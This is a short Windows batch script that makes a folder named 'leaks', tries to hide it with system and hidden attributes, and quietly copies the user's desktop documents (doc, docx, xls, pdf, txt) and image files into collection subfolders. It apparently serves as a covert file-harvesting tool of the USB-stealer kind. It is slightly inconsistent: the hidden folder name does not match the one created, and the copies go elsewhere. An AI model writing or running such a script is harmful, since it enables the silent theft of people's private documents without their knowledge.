:: create a new folder named "leaks"
md leaks
:: hide created folder "leaks"
attrib +R +S +A +H "leak" /S /D

:: docuements: preparation
md coll\documents
:: documents: file types: doc, docx, xls, pdf, txt
xcopy %userprofile%\desktop\*.doc coll\documents\*.doc /q /c /h /y /s
xcopy %userprofile%\desktop\*.docx coll\documents\*.docx /q /c /h /y /s
xcopy %userprofile%\desktop\*.xls coll\documents\*.xls /q /c /h /y /s
xcopy %userprofile%\desktop\*.pdf coll\documents\*.pdf /q /c /h /y /s
xcopy %userprofile%\desktop\*.txt coll\documents\*.txt /q /c /h /y /s

:: docuements: preparation
md coll\scans
:: scans: file types: jpg, ttf, png
xcopy %userprofile%\desktop\*.jpg coll\scans\*.jpg /q /c /h /y /s
xcopy %userprofile%\desktop\*.ttf coll\scans\*.ttf /q /c /h /y /s
xcopy %userprofile%\desktop\*.png coll\scans\*.png /q /c /h /y /s